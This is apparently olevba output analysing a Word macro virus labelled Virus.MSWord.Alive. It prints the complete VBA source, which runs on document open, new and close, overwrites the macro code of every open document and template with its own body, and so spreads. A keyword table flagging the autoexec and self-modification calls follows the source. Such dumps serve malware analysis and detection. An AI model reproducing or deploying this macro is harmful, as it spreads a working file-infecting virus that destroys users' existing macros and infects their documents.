olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alive
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alive - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Alive(): t = 0: c = c + 1

vHost = ThisDocument.VBProject.VBComponents(c).CodeModule.Lines(c, _
ThisDocument.VBProject.VBComponents(c).CodeModule.CountOfLines)

For t = 1 To Application.Documents.Count

    If t = 0 Then
    
    End
    
        Else
        
        With Documents(t).VBProject.VBComponents(c).CodeModule
        
        tu_je = .Lines(c, c)
        
            If tu_je <> "Private Sub Alive(): t = 0: c = c + 1" Then
            
                    .DeleteLines c, .CountOfLines
                    
                    .AddFromString vHost
                    
            End If
            
        End With
        
    End If
    
Next t
  
For n = 1 To Application.Templates.Count

    If t = 0 Then
    
    End
    
        Else
        
        With Templates(n).VBProject.VBComponents(c).CodeModule
        
        evo_je = .Lines(c, c)
        
            If evo_je <> "Private Sub Alive(): t = 0: c = c + 1" Then
            
                    .DeleteLines c, .CountOfLines
                
                    .AddFromString vHost
                
            End If
            
        End With
        
    End If
    
Next n

End Sub

Private Sub Document_New(): Alive: End Sub

Private Sub Document_Open(): Alive: End Sub

Private Sub Document_Close(): Alive: End Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

